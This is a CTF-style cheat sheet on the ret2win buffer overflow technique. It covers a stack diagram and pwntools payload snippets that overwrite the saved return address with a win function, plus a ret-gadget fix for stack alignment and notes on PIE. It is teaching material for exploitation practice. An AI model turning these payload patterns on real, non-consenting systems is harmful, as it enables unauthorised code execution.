# ret2win

**When:** The binary has a `win`/`shell` function (calls `system("/bin/sh")`, reads flag, etc.). No leak needed if no PIE.

**Prerequisites:**

- No stack canary (or leaked canary)
- Know the win function address (fixed if no PIE, or need leak if PIE)
- NX is fine (you're calling a function, not executing on stack)

## How it works

Overwrite saved RIP with the address of the win function. When `main` returns, execution jumps directly to `win` instead of the normal return path.

```
Stack before overflow:
+------------------+
| buffer           |  <- RSP (offset 0)
+------------------+
| saved RBP        |  <- RSP + offset
+------------------+
| saved RIP        |  <- RSP + offset + 8  <- return goes here
+------------------+
| ...              |

Stack after overflow:
+------------------+
| AAAA... (padding)|  <- fills buffer
+------------------+
| AAAA... (padding)|  <- fills saved RBP
+------------------+
| &win             |  <- overwrites saved RIP
+------------------+
```

## Code

```python
# Find offset with cyclic
payload = cyclic(500)
io.sendline(payload)
# Check RIP in core dump -> offset = cyclic_find(0x...)
offset = 72  # common value, verify for each binary

# Basic ret2win
payload = flat({offset: [e.symbols['win']]})
io.sendline(payload)
```

## Stack alignment

If the win function calls `system`, it may crash with SIGSEGV. This happens because glibc's `system` uses `movaps` which requires RSP to be 16-byte aligned. When you jump directly to `win`, RSP may be off by 8 bytes.

Fix: add a `ret` gadget before the win address. This pops nothing but adjusts RSP by 8, fixing alignment.

```
Without alignment:     With alignment:
[&win            ]     [ret_gadget      ]  <- pops nothing, RSP += 8
                        [&win            ]  <- now RSP is aligned
```

```python
ret = rop.find_gadget(['ret']).address
payload = flat({offset: [ret, e.symbols['win']]})
```

## Checking alignment

```python
# If system crashes, add ret
# If it still crashes, your offset is wrong or there's a canary
```

## Variations

- **Argument check bypass:** If win checks its arguments, you need to set them via ROP (see ret2libc for pop rdi gadgets). Some win functions let you jump past the check.
- **PIE:** If PIE is enabled but you have a leak, compute `e.address = leak - known_offset` first, then use `e.symbols['win']`.
